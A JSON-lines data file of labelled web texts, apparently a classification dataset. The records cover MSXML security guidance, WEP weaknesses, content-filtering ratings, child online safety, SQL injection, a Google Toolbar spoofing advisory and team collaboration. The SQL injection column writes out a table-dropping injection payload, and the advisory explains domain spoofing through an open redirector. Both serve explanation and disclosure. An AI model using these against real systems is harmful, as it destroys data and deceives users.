to a site micrõsoft.com, with the intent that it be interpreted as microsoft.com.\nBoth types of attacks might be used by an attacker to dupe host identity, probe for string processing vulnerabilities in a system, or as part of a phishing attack. A phishing attack is one where an attacker pretends to be from a trusted source. Typically, it involves an attempt to fool the user into entering user names, passwords, and other private information.\nXMLHTTP and ServerXMLHTTP do not validate string input, including the HTTP Verb and URL, submitted in the Open() method call. If your application completely controls the URLs which are passed to XMLHTTP or ServerXMLHTTP methods, including request headers and query string, you might not be vulnerable to this class of attacks. You are vulnerable if you permit URLs or portions of URLs from an untrusted source, including user input.\nThe ServerXMLHTTP and XMLHTTP components follow strict rules to permit or deny redirects. Note that the general behaviors described below might change with Internet Explorer or Windows security settings. The principle rules are the following:\nFor ServerXMLHTTP, there is no zone redirect checking when in asynchronous mode.\nTo mitigate Redirect-based DoS attacks, XMLHTTP and ServerXMLHTTP components implement redirect limits.\nRedirects are typically permitted from zones of greater security to zones of equal and lesser security. For example, a redirect from a resource in the Intranet zone to Internet zone should succeed.\nRedirects are not permitted from zones of lesser security to zones of greater security. For example, a redirect from a resource in the Internet zone to the My Computer zone should fail.\nRedirects are not permitted across networking protocols.\nRedirects are not permitted across network domains.\nStrictness in MSXML 6.0 May Prevent Some Applications from Working\nIE defines five zones - MyComputer, Trusted Sites, Local intranet, Internet, and Restricted Sites. There are a number of rules regarding how a site in one zone can reference a site in another zone. For example, a site on the Internet can't reference a document on the Local intranet. In IE, and for applications that set the site explicitly, MSXML 6.0 is strict about URL redirection, and may prevent some user scenarios. In order to work around the security restrictions, the user can add the machine doing the redirection to the list of trusted sites on the machine where the redirection is taking place.\nError Messages May Reveal Data\nThe description of an error may reveal data. Error messages should not be exposed to callers that are not trusted. You should catch all errors and report errors with your own custom error messages.\nThe following sections provide information specific to ServerXMLHTTP.\nUse ServerXMLHTTP Only on the Server\nServerXMLHTTP should not be hosted in the browser; it is not marked safe for scripting.\nUse HTTPS to Provide Encryption for Sensitive Data\nServerXMLHTTP does not provide any encryption by default. You should use HTTPS connections to encrypt sensitive data during transmission.\nResponse Packages Are Insecure\nResponse packages are generally not secure (responseXML Property (ServerXMLHTTP/IServerXMLHTTPRequest), responseBody Property (ServerXMLHTTPRequest/IServerXMLHTTPRequest), and responseText Property (ServerXMLHTTP/IServerXMLHTTPRequest)). ServerXMLHTTP is used to retrieve information from other sites on the internet. When you retrieve data using it, you should know that the source of your information is trustworthy. Further, after using a response package, you should check for malicious data (both size and content). The ServerXMLHTTP object does not check for denial of service threats or bad data returned from response packages. ServerXMLHTTP should not be used to load untrusted XML in applications where denial of service is a concern.\nNo Secure-Base-URL Checking for Redirects\nServerXMLHTTP does not provide secure-base-URL checking for redirects. You should be aware that, when accessing untrusted locations with MSXML 6.0 ServerXMLHTTP or MSXML 3.0 ServerXMLHTTP in asynchronous mode, there are no checks on redirects. There are checks on the initial Open (both for the Open call and for any external references within the instance).\nSpoofing and Best-Fit Character Attacks\nServerXMLHTTP is vulnerable to both spoofing attacks and best-fit character attacks. For more details, see the discussion under XMLHTTP, earlier in this topic.", "label": 1}
{"text": "WEP is the encryption standard that comes with WiFi LANs. It uses RC4 encryption, which is the same as that used by the security built into standard web browsers (SSL). One might think, therefore, that it is sufficiently tried and tested to be trusted. Well, there's not a great deal wrong with RC4 -- but there is a great deal wrong with its implementation within WiFi. Put simply, it should not be used in this manner. (Technically, it is a stream cipher being used where a stream cipher should not be used. A block cipher would have been better for WLANs. But RC4 was easy and cheap to implement - and with 40 bit keys it was not subject to the then existent US export laws.)\nProblems with WEP were known at the end of year 2000. But in summer 2001, the well-known cryptographers Fluhrer, Mantin and Shamir (the 'S' of RSA) published a new paper in which “we show that RC4 is completely insecure in a common mode of operation which is used in the widely deployed Wired Equivalent Privacy protocol (WEP, which is part of the 802.11 standard), in which a fixed secret key is concatenated with known IV modifiers in order to encrypt different messages. Our new passive ciphertext-only attack on this mode can recover an arbitrarily long key in a negligible amount of time...”\nIn simple English, this is devastating news for the security of 802.11 WLANs. Basically, there is no security. It prompted Phil Belanger, past chairman and current marketing director of WECA, to comment: “We perceive this as serious and different from the previous attacks, and we're not going to say 'Don't worry about it'. However, we've always said that if privacy is a concern, you need to be using end-to-end security mechanisms, like virtual private networks, along with the WLAN.”\nWithout going into the technical details, RC4's implementation within WiFi means that in cryptographic terms it is a trivial matter to break the encryption. To make matters worse, there is a freely available hacking tool on the Internet (AirSnort) that can do all the hard work automatically. As a result, wireless LANs using WEP encryption are as vulnerable to script kiddies (wannabee hackers without their technical expertise) as they are to genuine hackers.\nBut of course the real problem isn't limited to traffic on the WLAN. Once a wireless terminal is compromised, the hacker has effectively bypassed any firewall and gained access to the entire corporate wired LAN.", "label": 1}
{"text": "Additions, clarifications, and corrections regarding the content of this document will be most graciously accepted: please send email to firstname.lastname@example.org.\nRating: Value judgments are used to categorize web sites based on their content. These ratings could use simple allowed/disallowed distinctions like those found in programs like CyberSitter or NetNanny, or they can have many values, as seen in ratings systems based on Platform for Internet Content Selection (PICS, see question 3.0).\nFiltering: With each request for information, the filtering software examines the resource that the user has requested. If the resource is on the \"not allowed\" list, or if it does not have the proper PICS rating, the filtering software tells the user that access has been denied and the browser does not display the contents of the web site.\nThe first content filters were stand-alone systems consisting of mechanisms for determining which sites should be blocked, along with software to do the filtering, all provided by a single vendor.\nThe other type of content filter is protocol-based. These systems consist of software that uses established standards for communicating ratings information across the Internet. Unlike stand-alone systems, protocol-based systems do not contain any information regarding which sites (or types of sites) should be blocked. Protocol-based systems simply know how to find this information on the Internet, and how to interpret it.\nFilters and ratings systems are seen as tools that would provide the cyberspace equivalent of the physical separations that are used to limit access to \"adult\" materials. In rating a site as objectionable, and refusing to display it on the user's computer screen, filters and ratings systems can be used to prevent children from seeing material that their parents find objectionable. In preventing access, the software acts as an automated version of the convenience-store clerk who refuses to sell adult magazines to high-school students.\nFilters are also used by businesses to prevent employees from accessing Internet resources that are either not work related or otherwise deemed inappropriate.\nWhether used in homes or workplaces, these tools raise serious privacy concerns.\nList-based blocking works by explicitly enumerating sites that should either be blocked or allowed. These lists are generally provided by filter vendors, who search for sites that meet criteria for being classified as either \"objectionable\" or \"family-friendly\".\nFiltering software vendors vary greatly in the amount of information and control they make available to users. Most vendors do not allow users to see the actual list of blocked sites, as it is considered to be a kind of trade secret. However, some vendors provide detailed descriptions of the criteria used to determine which sites should be blocked. Some vendors might allow users to add sites to the list, either in their own software or by sending sites to the vendor for review.\nStand-alone filtering tools also vary in the extent to which they can be configured by users. Some software packages allow users to make selections from a list of the categories they would like blocked. For example, a parent may wish to block explicit sex but not discussions of homosexuality as a life-style. Others might allow users to choose from a range of choices in any given topic area. For example, instead of simply blocking all nudity, these tools might allow users to chose to allow partial nudity while blocking full nudity.\nKeyword-based blocking uses text searches to categorize sites. If a site contains objectionable words or phrases, it will be blocked.\nFirst, these lists are incomplete. Due to the decentralized nature of the Internet, it's practically impossible to definitively search all Internet sites for \"objectionable\" material. Even with a paid staff searching for sites to block, software vendors cannot hope to identify all sites that meet their blocking criteria. Furthermore, since new web sites are constantly appearing, even regular updates from the software vendor will not block out all adult web sites. Each updated list will be obsolete as soon as it is released, as any as any site that appears after the update will not be on the list, and will not be blocked. The volatility of individual sites is yet another potential cause of trouble. Adult material might be added to (or removed from) a site soon after the site is added to (or removed from) a list of blocked sites.\nBlocking lists also raise problems by withholding information from users, who may or may not have access to information describing the criteria used to block web sites. While some vendors provide descriptions of their blocking criteria, this information is often vague or incomplete. Several vendors have extended blocking beyond merely \"objectionable\" materials. In some instances, political sites and sites that criticize blocking software have been blocked.\nThis obscurity is compounded by practices used to protect these lists of blocked sites. Vendors often consider these lists to be proprietary intellectual property, which they protect through mathematical encryption, which renders the lists incomprehensible to end users. As a result, users are unable to examine which sites are blocked and why. This arbitrary behavior demeans the user's role as an active, thoughtful participant in their use of the Internet.\nKeyword searches cannot use contextual information. While searches can identify the presence of certain words in a text, they cannot evaluate the context in which those words are used. For example, a search might find the word \"breast\" on a web page, but it cannot determine whether that word was used in a chicken recipe, an erotic story, or in some other manner. In one notable incident, America Online's keyword searches blocked a breast cancer support group.\nKeyword searches cannot interpret graphics. It is not currently possible to \"search\" the contents of a picture. Therefore, a page containing sexually explicit pictures will be blocked only if the text on that page contains one or more words from the list of words to be blocked.\nThe Massachusetts Institute of Technology's World Wide Web Consortium has developed a set of technical standards called PICS (Platform for Internet Content Selection) so that people can electronically distribute descriptions of digital works in a simple, computer-readable form. Computers can process these labels in the background, automatically shielding users from undesirable material or directing their attention to sites of particular interest. The original impetus for PICS was to allow parents and teachers to screen materials they felt were inappropriate for children using the Net. Rather than censoring what is distributed, as the Communications Decency Act and other legislative initiatives have tried to do, PICS enables users to control what they receive.There are two components involved in the practical use of PICS: ratings systems, and software that uses ratings systems to filter content.\nPICS-based software uses an alternative approach based on distributed sharing of ratings information. Instead of using blocking lists or keyword searches, programs that use PICS use standardized \"ratings systems\" to determine which sites should be blocked. Available from software vendors or from Internet sites, these ratings systems are be used to describe the content of Internet sites (see question 3.7 for a description of how PICS works in practice). Users of PICS-based software are usually given the ability to choose which ratings system they would like to use.\nAs an open standard, PICS can be used for a wide range of applications. In addition to providing a means for blocking content deemed unsuitable for children, PICS might also be used for describing content in terms of its educational content, potential for violations of privacy, or any other criteria that involve rating of Internet sites.\nIn some senses, programs that use PICS are much more flexible than stand-alone filtering software. Users of PICS software are not tied to the judgments of the software vendor, and the descriptions of the criteria used by the ratings systems are publicly available. However, users are currently limited to choosing between a small number of ratings systems, each of which has its own biases and viewpoints. Users that disagree with the popular ratings systems may be unable to use PICS in a manner that fits their needs and viewpoints.\nA rating is a description of some particular Internet content, using the terms and vocabulary of some ratings system.\nSelf-Rating: Web site publishers can evaluate their own content and put PICS rating information directly into their web pages. Currently, this evaluation can be done through Web pages provided by developers of the major ratings services.\nThird-Party Ratings: Interested third parties can use PICS ratings systems to evaluate web sites and publish their own ratings for these sites. Educational groups, religious groups, or individuals can rate sites and publish these ratings on the Internet for users to access.\nYour browser software may influence choice of ratings service. If you use Microsoft's Internet Explorer, you only have one choice (RSACi) built in to the initial distribution. To use other ratings services, IE users must download files from the 'Net and install them on their PCs.\nCurrently (as of September 1997), there are three PICS services that are being widely used or promoted:\nRSACi: Sponsored by the Recreational Software Advisory Council (known for ratings on video games), RSACi is probably the most widely used PICS ratings system in use today. RSACi's ratings categories include violence, nudity, sex, and language, with 5 ratings within each category. As of September 1997, RSACi claims to have over 43,000 sites rated.\nSafeSurf: Developed by the SafeSurf corporation, this system's categories include \"Age Range,\" \"Profanity,\" \"Heterosexual Themes,\" \"Homosexual Themes,\" \"Nudity,\" \"Violence,\" \"Sex, Violence, and Profanity, \" \"Intolerance,\" \"Glorifying Drug Use,\" \"Other Adult Themes,\" and \"Gambling,\" with 9 distinctions for each category.\nSafeSurf and RSACi both rely on self-rating of Internet sites by web publishers.\nNetShepherd: Based in Calgary, Net Shepherd rates sites based on quality levels (1-5 stars). Unlike SafeSurf and RSAC, NetShepherd conducts third-party ratings of web sites. They claim to have rated over 300,000 sites. NetShepherd has also announced partnerships with firms such as Altavista and Catholic Telecom, Inc.\nOnce these choices have been made, the browser software uses them to filter sites. When an Internet site is requested, the browser compares the site's rating with the user's selection. If the site has ratings for the chosen system and those ratings fit within the parameters chosen by the user, it is displayed as usual. If the appropriate ratings fall outside of those parameters (perhaps the site has \"frontal nudity,\" while the user was only willing to accept \"partial nudity\"), access to the site is prohibited, and the user is shown a message indicating that the site is blocked.\nSince most web sites are not currently rated, most software provides users with the option of blocking out sites that do not contain PICS ratings.\nIn order to prevent mischievous children from changing ratings or disabling PICS altogether, most browsers can be configured to require a password before disabling PICS.\nRSACi, SafeSurf, and other proponents of ratings would obviously like everyone to rate their sites, while civil libertarians and opponents of ratings argue against any ratings.\nPublishers of family-oriented sites or those who are trying to reach audiences concerned with Internet content might consider rating. Similarly, purveyors of adult material might rate their sites in order to be \"good citizens\".\nIn evaluating ratings systems, publishers may want to examine the categories used by each system and the distinctions used by those categories. Different systems will classify ratings systems in different ways, some of which may misrepresent the content of web sites. For example, sites discussing safe sex might not want to be placed in the same category with pornographic sites.\nWeb site publishers might also consider the popularity of the ratings services. Currently (as of September 1997), there are only a few major ratings services. Publishers are free to user other ratings, but these may not be useful to the Internet users who rely upon the popular systems. This presents a dilemma for some publishers, who can either accept the ratings of the popular systems, even if those ratings misrepresent their material, or refuse to rate their sites, knowing that this might cause their sites to be unavailable to some users.\nVersions of Microsoft's Internet Explorer have provided an extreme example of this problem. Although IE allows user to use any PICS ratings system, RSACi is the only system that is built in to the selection list. Since Internet Explorer is the most widely-used PICS-capable browser (as of fall 1997, Netscape's Navigator does not support PICS), it seems likely that many PICS users will be relying upon RSACi. For publishers interested in reaching a wide audience, this market force may determine their choice of ratings system.\nFinally, philosophical concerns may cause some people to decide not to rate. Web-site publishers who are not comfortable with the general content of available ratings systems, or who object to the concept of ratings, may choose not to rate their own sites.\nMSNBC's troubles with ratings provide an ironic illustration of this possibility. Displeased with the RSACi ratings that would be necessary, MSNBC management removed all rating information from the site. MSNBC and other news organizations briefly discussed the possibility of creating a new ratings system specifically for news reporting.\nWhile this proposal was eventually rejected, it illustrates some of the problems with content ratings. Well-funded publishers like MSNBC might be able to effectively create ratings systems that meet their needs, but smaller publishers who want to rate their sites may be forced to accept unsatisfactory ratings.\nTo make matters worse, third party rating does not require the consent or even notification of a web-site publisher. Since third party ratings are distributed by third party \"label bureaus,\" a web-site publisher may not know if her pages have been rated, or what the ratings said.\nThird-party ratings also present significant technical challenges that may discourage their development. Unlike self-ratings, third party PICS ratings do not reside on publisher's web pages. Instead, they must be distributed to users using one of two methods:\nSome software, such as Microsoft's Internet Explorer, provides users with the option of blocking out any site that does not have a rating. This choice may be appropriate for some, but it severely restricts the available options. By blocking out most of the Web (including possibly some sites designed for younger users), this approach presents children with a severely restricted view of the world.\nThese issues of quality and accountability would become even trickier if numerous schemes were to come into use. If there were dozens of PICS ratings schemes to choose from, publishers would not know which to choose, and users might not know which to trust.\nThe first - and currently the only viable alternative - is to avoid use of PICS for self-rating, and in Internet browsers.\nThe second approach would be to develop a new ratings vocabulary, as an alternative to RSACi, SafeSurf, or other currently available ratings systems. This involves several steps:\nThe first step is generation of a ratings system, including categories that would be discussed and distinctions within those categories. This would require a discussion of the values that will be represented in the ratings system, and how these values should be expressed.\nOnce the system has been developed, sites must be rated. This can be done in one of two ways:\nGiven the significant resources that will be needed to effectively deploy a new ratings system, it seems unlikely that there will be a large number of PICS alternatives available in the near future. The developers of PICS are trying to change this through the PICS Incubator project, which offers resources to organizations interested in developing new ratings systems.\nBook reviews and movie ratings are only two examples of the many ways in which we use information filters. Used in conjunction with other information sources - including advertising and word-of-mouth - these ratings provide a basis for making informed decisions regarding information.\nUnfortunately, PICS does not currently provide users with the contextual information and range of choices necessary for informed decision making. When deciding which movies to see, we have access to reviews, advertisements and trailers which provide information regarding the content. These details help us choose intelligently based on our values and preferences. On the other hand, PICS-based systems do not provide any contextual detail: users are simply told that access to a site is denied because the site's rating exceeds a certain value on the rating scale.\nFurthermore, the limited range of currently available PICS ratings system does not provide users with a meaningful choice between alternatives. Parents who are not comfortable with any of the current ratings systems may not find PICS to be a viable alternative.\nContinuing with our analogies to other media, consider book reviews in a world where only two or three publications reviewed books. This might work very well for people who agree with the opinions of these reviewers (and, of course, for the reviewers themselves!), but it would work very poorly for those who have differing viewpoints.\nSome might argue that the \"success\" of a single set of movie ratings offers a model for PICS. However, ratings are generally applied only to movies made for entertainment by major producers. Documentaries and educational films are generally not rated, but similar web sites could be rated under PICS.\nMovie ratings also provide a cautionary lesson that should be considered with respect to the Internet. Unrated movies, or movies with certain ratings, often have a difficult time reaching audiences, as they may not be shown in certain theaters or carried by large video chains. This has led to self-censorship, as directors trim explicit scenes in order to avoid NC-17 ratings. This may be appropriate for commercially-oriented entertainment, but it could be dangerous when applied to safe-sex information on the Internet.\nRatings systems also fail to account for the global nature of the Internet. Legal or practical pressures aimed at convincing Internet publishers to rate their own sites will have little effect, as these businesses or individuals have the option of simply moving their material to a foreign country. Furthermore, the existing ratings systems are of limited value to those in countries that do not share western values.\nConcerns about unrated international material or differing cultural values could be addressed through direct censorship. For example, governments might use PICS ratings or proprietary filtering software to implement \"national firewalls\" which would screen out objectionable material. Alternatively, ratings might be used to \"punish\" inappropriate speech. If search engines chose to block sites with certain ratings (or unrated sites), or if browsers blocked certain ratings (or lack of ratings) by default, these sites might never be seen.\nIt is possible that a wide range of PICS ratings system could come into use, providing families with a real opportunity to choose ratings that meet their values. The utility of PICS might also be increased by use of new technologies like \"metadata\" (data about data, used to describe the content of web pages and other information resources), which might be used to provide contextual information along with PICS ratings. However, these tools may not be available for general use for some time, if at all.\nSome people confuse ratings with the topical organization that is used in libraries and Web sites like Yahoo. While no system of organization of information is neutral, topical schemes attempt to describe what a resource is \"about\". Rating rarely helps us find information resources topically and is usually too narrowly focused on a few criteria to be useful for information retrieval.\nIf this question is taken to mean: \"Are there any solutions that would provide children with the ability to use the Internet without ever seeing material that is explicit or \"adult,\"the answer is probably yes. This would require a combination of three factors:\nIf the question is interpreted as meaning: \"Are there any solutions that provide some protection from adult or objectionable material without restricting free speech?\" the answer is much less clear. Stand-alone systems clearly don't meet these criteria, as they place users at the whims of software vendors, who may block sites for arbitrary reasons. In theory, PICS might fit this role, but the lack of a meaningful choice between substantially different ratings systems leaves parents and publishers with the choice of using ratings that they may not agree with, or that fail to adequately describe their needs or materials.\nDescribing speech as \"adult\" or \"appropriate for children\" is inherently a tricky and value-laden process. In the U.S., many people have attempted to prevent schools and libraries from using everyday publications like Huckleberry Finn and descriptions of gay/lesbian lifestyles. The fierce debates over these efforts show that no consensus can be reached. Increased use of filtering software would likely be the beginning, rather than the end, of debates regarding what Internet materials are \"appropriate\" for children, and who gets to make that decision.\nSecondly, parents should play an active role and interest in their children's use of the Internet. For some children this might mean restricting Internet use to closely supervised sessions. Other children might be able to work with clearly defined rules and guidelines. To discourage unsupervised use of the Internet, parents might consider measures such as placing the family computer in a common space in the home and retaining adult control over any passwords required for Internet access.\nParents should also work to educate children regarding proper use of the Internet. Just as parents teach children not to talk to strangers on the street, parents might discourage children from visiting certain web sites, divulging personal or family information, or participating in inappropriate chats.\nSome parents might consider using filtering software, despite all of the potential drawbacks. Parents considering this route should closely examine their options, in order to understand their options and the implications of any choice.\nFor stand-alone filtering systems, this means investigating the criteria used in developing blocking lists and/or news reports describing the software. If possible, parents might try to find stand-alone systems that allow users to view and edit the lists of blocked sites.\nParents considering the use of PICS systems should investigate the categories used by the various ratings systems, in order to find one that meets their needs. Information about PICS-based systems can be found at the home pages of the respective ratings systems.\nIn general, the use of a filtering product involves an implicit acceptance of the criteria used to generate the ratings involved. Before making this decision, parents should take care to insure that the values behind the ratings are compatible with their beliefs.\nFinally, parents should realize that the Internet is just a reflection of society in general. Much of the \"adult\" content on the Internet can be found on cable TV, at local video stores, or in movie theaters. Since other media fail to shield children from violence or sexual content, restrictions on the Internet will always be incomplete.\nISP-Based Filtering: ISPs might do the filtering themselves, preventing their customers from accessing objectionable materials, even if those customers do not have their own filtering software. This requires the use of a proxy server, which would serve as a broker between the ISP's customers and remote web sites. When a customer of a filtering ISP wants to see a web site, his request goes to the proxy server operated by the ISP. The proxy server will then check to see if the site should be blocked. If the site is allowable, the proxy server retrieves the web page and returns it to the customer.\nThis approach is technically feasible. In fact, it's currently used by many corporations, and some ISPs that offer this service. However, proxying requires significant computational resources that may be beyond the means of smaller ISPs. Even if the ISP can afford the computers and Internet bandwidth needed, this approach is still far from ideal. In order to do the filtering, proxy servers would have to use stand-alone or PICS-based systems, so they would be subject to the limitations of these technologies (see 2.4, 2.5, and 3.13). The shortcomings of existing filtering systems may prove particularly troublesome for ISPs that advertise filtering services, as these firms could be embarrassed or worse if their filters fail to block adult material. Finally, ISPs that filter material may lose customers who are interested in unfiltered access to the Internet.\nProviding Filtering Software: Others have suggested that ISPs should be required to provide users with filtering software. While this might be welcome by parents who are thinking about getting on to the 'Net (and by software vendors!) it could present a financial serious burden for smaller ISPs.\nMost advocates of the use of blocking software by libraries have forgotten that the public library is a branch of government, and therefore subject to First Amendment rules which prohibit content-based censorship of speech. These rules apply to the acquisition or the removal of Internet content by a library. Secondly, government rules classifying speech by the acceptability of content (in libraries or elsewhere) are inherently suspect, may not be vague or overbroad, and must conform to existing legal parameters laid out by the Supreme Court. Third, a library may not delegate to a private organization, such as the publisher of blocking software, the discretion to determine what library users may see. Fourth, forcing patrons to ask a librarian to turn off blocking software has a chilling effect under the First Amendment.\nThe PICS Incubator Project\nFahrenheit 451.2: Is Cyberspace Burning? - The ACLU's Report on Filtering Software\nThe Censorware Project The Global Internet Liberty Campaign has an excellent page on ratings and filters.\nThe Internet Free Expression Alliance is a coalition of groups working to preserve open expression on the Internet.\nComputer Professionals for Social Responsibility (CPSR)", "label": 1}
{"text": "Caught in the Web: Keeping Your Kids Safe Online\nThe world wide web can be a wide world of sites that you don't want your child or teen stumbling into. Read our guide for navigating internet safety.\nBe Open. Put computers in a high traffic area. Your son/daughter will be less likely to access or post inappropriate content if they know you can see the screen. Consider not allowing your teen to have a data plan on their cell phone.\nAlso, openly communicate with your child. Make sure you know what their interests are and talk to them about what they like to do when they're on the internet.\n. Tell your child they can only join Facebook if you have an account, too.\nMake Clear Rules. Let your child know how long they can stay on the computer, what types of sites they can visit, what software they can use, etc.\nInstall Security Tools. Keep your anti-virus software up-to-date and check your browser's security settings. Not sure what those settings should be? Check out StaySafeOnline.org.\nHere are some other ways to keep your computer safe and secure:\n- Check With Your Internet Service Provider. They may offer special services or programs designed to keep your kids safe online.\n- Install Special Software. There are a variety of tools available that meet a variety of needs. Check out InternetSafety.com for several, family-friendly options that you can customize for your needs.\nAdapted from the Department of Homeland Security's guidelines.\nRelated Articles: Safety", "label": 1}
{"text": "No secret to stopping XSS and SQL injection attacks\nRead, test, communicate, repeat\nSQL injection attacks and cross-site scripting exploits just won't die.\nThe most recent and high-profile incident was a mass webpage attack on more than 100,000 pages, which included victims as diverse as The Wall Street Journal, TomTom, and the UK's Strathclyde police.\nBut none of it would have been possible if the sites involved had been more resilient to SQL injection attacks. This signals a lack of awareness among developers — but we shouldn't just be pointing the finger at them. The problem also comes back to a lack of awareness among testers, who really should be actively testing applications for common security holes as a matter of course.\nBut the problem goes even deeper than that. The current emphasis on unit testing among developers has produced a myopic attitude to testing, in which integration testing — which would help to expose certain security flaws — is seen as too troublesome to bother with.\nThe frustrating thing about SQL injection attacks in particular, though, is that they're so easy to prevent in the first place — and easy to test for, of course.\nTake the following query. Let's say we run a travel website where somebody searches for hotels in Blackpool. The query, constructed in your server code, would look something like:\nSELECT * FROM hotels WHERE city = 'Blackpool';\nIn the search form, the user would enter a town/city. The server component extracts this value from the submitted form, and places it directly into the query.\nGiving effectively free access to the database opens up all sorts of potential for sneaky shenanigans from unscrupulous exploiters. All the user has to do is add their own closing single-quote in the search form, plus some additional gubbins to turn it into a valid query:\nEverything after the -- is treated as a comment, so the door to your data is now wide open. How about if the user types into the search form:\nBlackpool'; DROP TABLE hotels; --\nYour server-side code will faithfully construct this into the following SQL, and pass it straight to the database, which in turn will chug away without question, just following orders:\nSELECT * FROM hotels WHERE city = 'Blackpool'; DROP TABLE hotels; --';\nDepending how malicious the attacker is, they could wreak all sorts of havoc or (worse, in a way) build on the \"base exploit\" to extract other users' passwords from the database. There's a good list of SQL injection examples here.\nNext page: Sanitized for your protection", "label": 1}
{"text": "Google Toolbar allows spoofing the information presented in the dialog which is being displayed when adding a new Google Toolbar button. This can allow an attacker to convince the users that his button comes from a trusted domain. This button can then be used to download malicious files or conduct phishing attacks (e.g. show a login form of a bank).\n- Google Toolbar 5 beta for Internet Explorer\n- Google Toolbar 4 for Internet Explorer\n- Google Toolbar 4 for Firefox (partially)\nGoogle Toolbar provides a nice API for creating toolbar buttons. Basically, the button information is stored in an XML file.\nIn order to add a button, the toolbar user must click on a specially crafted link which refers to the button's XML file. When the user click on the link, a dialog appears with all the following details: The domain where the button is being downloaded from, the name, description and icon of the button and some \"privacy considerations\", which basically shows the domains which the button interacts with (sends/receive information).\nBy creating a specially crafted URLs it is possible for an attacker to fake the domains displayed in the \"Downloaded from\" and \"Privacy considerations\" sections. This specially crafted URL can be created by simply adding an open redirector (e.g. in google.com - http://www.google.com/local_url?q=) before the URL.\nAn attacker can use this vulnerability to gain the victim's trust to add and use the button, and by that the victim will trust the files that the button offer, or enter private information. In the new beta version of the toolbar it is also possible to alert the user every few seconds to click on the button.\nIn the Firefox version of Google Toolbar it is only possible to fake the \"Privacy considerations\" section.\nA proof-of-concept which adds a \"critical update\" button can be found here. Use it at your own risk, though it shouldn't do anything but suggest you to download gupdate.exe from my site, which is basically the windows calculator.\nWorkaround / Suggestion\nGoogle have acknowledged this and are already working on a fix.\nUntil a fixed version is provided, I suggest to avoid adding new buttons to the toolbar.", "label": 1}
{"text": "With almost a billion friends on Facebook, six billion cell phone accounts globally, and twenty billion \"things\" from refrigerators to bridge spans to micro-medical devices soon to be wired by Internet, the digital age is upon us in full force. Everyone and everything is connected or soon will be by social media, on mobile platforms, and in the cloud. That puts vast new arrays of assets in play, from crowds to drones, sensors to shoppers. If teams can leverage those assets, hard and soft, digital and real-world, mass them quickly or marshal them with precision accuracy, teams can gain advantage as never before.\nThe recent Kony2012 viral video offers proof that something special is happening as a result of all this connectedness: digital collaboration has come of age. Garnering 100 million YouTube views in six days the fastest ever to reach that mark Kony2012 demonstrated that digital collaboration can create astounding effects not possible just five years ago.\nAchieving those effects is no accident. While much is made of \"emergent collaboration,\" Kony2012 went viral by design. The Invisible Children, Inc. team that masterminded the campaign comprised veteran media activists and fundraisers pursuing a common enough goal (a criminal's arrest), but using skills and means unique to the digital age: a viral message, built on a 30-minute video, self-replicating among millions of real-world and online partisans across networks.\nEmergent, yes. But no less planned or executed than another viral blockbuster the OMGPOP team's March 2012 breakout of Draw Something, a Pictionary-like game. Three weeks after launch, gamers, Facebook friends and Twitter followers had downloaded the Draw Something app 35 million times, created over one billion pictures and were creating three thousand drawings per second. Close interplay between social and mobile platforms accelerated the effect. Collaboration between OMGPOP and Couchbase, its database partner, assured it. Teams scaled the cloud implementation to handle the massive load without downtime. The result: by late March 2012, Draw Something had 15 million daily players and was the Apple AppStore's #1 word game in 84 countries.\nViral-by-design is a unique effect of digital collaboration. The Invisible Children and the OMGPOP teams each achieved it.\nCan you? Don't stop at viral-by-design. Today, teams can achieve seven further effects unique to collaboration in the digital age. They are the fuel in the engine of the networked world. Each can confer decisive advantage in the marketplace or the school room, the battlespace or the political race. Each is the new work of teams today.\n1. Precision Identity. In the digital world, where you are defines who you are. Everyone has a unique geospatial identity: you and only you were over \"there\" a minute ago and over \"here\" now. Competitors know your customers by the stores they visit payday Fridays and grab their attention and wallet on Thursdays. Strike teams know insurgents by the mud huts they visit, then find and disassemble terrorist networks faster. Precision identity is a capability. Do you have it?\n2. Mass Customization. From Nikes to K-12 curricula, drone strikes to personalized medicines, teams can mass produce unique solutions for anyone. The truly disruptive move in K-12 education, for example, will be personalized curricula uniquely customized student-by-student. Love skateboards? Here's the physics of staying on your deck jumping a 360-degree ollie while riding fakie. Yes, you can download an app for that!\n3. Common Operating Pictures. Dozens of systems and networks tell some of the stories about your firm. None tell the whole story. Now you can line them all up, from social media, consumer insights, competitive intelligence, marketplace measurement, sales, and distribution. Share a total view of performance at a single point in time with partners and colleagues so everyone is on the same page. You won't be the first to get this view. Don't be the last.\n4. Rapid Innovation/Move-to-Market Cycles. \"Collaboration with customers slows me down.\" Wrong: collaboration with customers speeds your move to market. You avoid rework and get value in the hands of users fast. Just ask Steve Ellis, EVP at Wells Fargo, whose team took Wells's wholesale services online in a year. \"Fastest uptake I ever saw,\" he said. The result: spectacular growth in transactions, from $1 trillion to $11 trillion over a decade.\n5. Crowd-Sourced Creation. Whether online (think: Wikipedia) or on the fly (think: Twitter), in design (think: Local Motors' Rally Fighter car) or in finance (think: Kickstarter), millions contributing a little make crowds smarter, richer and happier, faster. Love the crowd; it will love you right back.\n6. Real-Time Situational Awareness. What's going on in the factory across the globe, on the store-shelf across town, or with that crowd straight ahead? You can achieve 360/real-time awareness of your situation now, from remote sensing to location awareness. By the way you already feature in someone else's 360 \"SA\". But you knew that!\n7. Predicting the Future Faster, Sooner. \"Big data\" analytics with real-world guides let you see big-picture patterns and micro-trends with astonishing precision, in time to seize the day or head off disaster. That knack market leaders have for knowing what will happen next, and when? That's by design.\nTransforming effects to results requires strategy, management, and even more collaboration. Barack Obama is President of the United States today because David Plouffe stitched together Obama2008's team of campaign veterans, e-commerce pros, and social media experts. That team achieved all eight digital-age effects, supercharged partisans for age-old purposes raise money, knock on doors, and get out the vote and gained victory on November 4, 2008. \"The big difference this year is not the technology,\" Joe Rospars, the campaign's social media chief said. \"It's the coordination.\"\nEffects alone never guarantee results. Despite Kony2012, Joseph Kony remains free. But make no mistake. There's plenty of room on history's ash heap for those who assume this all happens by chance.\nFor teams that can attain these effects by capability by design watch out, world.\nThis post is part of the HBR Insight Center on The Secrets of Great Teams.", "label": 1}
